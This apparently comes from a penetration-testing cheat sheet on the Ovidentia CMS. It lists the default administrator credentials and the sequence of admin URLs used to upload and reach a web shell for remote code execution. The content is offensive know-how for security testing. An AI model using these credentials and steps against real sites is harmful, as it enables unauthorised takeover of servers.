# Web applications - CMS - Ovidentia

### Default credentials

The default administrator credentials are:

```
admin@admin.bab:012345678
```

### Administrator to RCE

Access the file upload configuration page and make sure that the web service
has write rights on the currently configured upload folder:

```
/index.php?tg=site&idx=menu4&item=1
```

Then use the administration file manager page to create a folder on the
application:

```
/php/index.php?tg=admfms
```

And configure the access rights on the folder to allows file upload and
others permissions:

```
/php/index.php?tg=admfm&idx=rights&fid=<FOLDERID>
```

Upload file a web shell on the target:

```
/index.php?tg=fileman&idx=displayAddFileForm&id=<FOLDERID>&gr=Y&path=<FOLDERNAME>
```

The uploaded web shell can be accessed at the following URL:

```
/fileManager/collectives/DG0
```
